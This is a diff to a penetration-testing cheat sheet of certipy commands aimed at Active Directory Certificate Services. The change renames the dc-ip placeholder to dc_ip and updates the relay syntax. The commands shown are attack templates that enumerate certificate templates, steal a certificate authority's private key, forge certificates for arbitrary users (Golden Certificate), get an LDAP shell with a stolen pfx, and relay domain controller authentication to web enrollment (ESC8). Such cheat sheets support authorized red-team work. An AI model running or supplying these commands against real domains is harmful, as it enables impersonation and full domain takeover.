@@ -5,7 +5,7 @@
 ## certipy - list certificate templates
 #plateform/linux #target/remote #cat/RECON
 ```
-certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
+certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> 
 ```
 
 ## certipy - request certificate
@@ -23,7 +23,7 @@ certipy auth -pfx <pfx-file>
 ## certipy - authenticate through LDAP (Schannel) with pfx certificate
 #plateform/linux #target/remote #cat/CONNECT
 ```
-certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
+certipy auth -pfx <pfx-file> -dc-ip <dc_ip> -ldap-shell
 ```
 
 ## certipy - Golden Certificate - steal CA certificate and private key
@@ -35,7 +35,7 @@ certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority
 ## certipy - Golden Certificate - forge certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
+certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc_ip>:389
 ```
 
 ## certipy - request certificate for another user - ESC1 - ESC6
@@ -65,13 +65,13 @@ certipy ca -u <user>@<domain> -p '<password>' -ca <certificate-authority> -issue
 ## certipy - relay authentication to CA Web Enrollment - ESC8
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy relay -ca <ca-fqdn>
+certipy relay -target 'http://<ca-fqdn>'
 ```
 
 ## certipy - relay domain controller authentication to CA Web Enrollment - ESC8
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy relay -ca <ca-fqdn> -template 'DomainController'
+certipy relay -ca <ca-fqdn> -template 'DomainController' -target 'http://<ca-fqdn>'
 ```
 
 ## certipy - Modify user upn to another one - ESC9 - ESC10
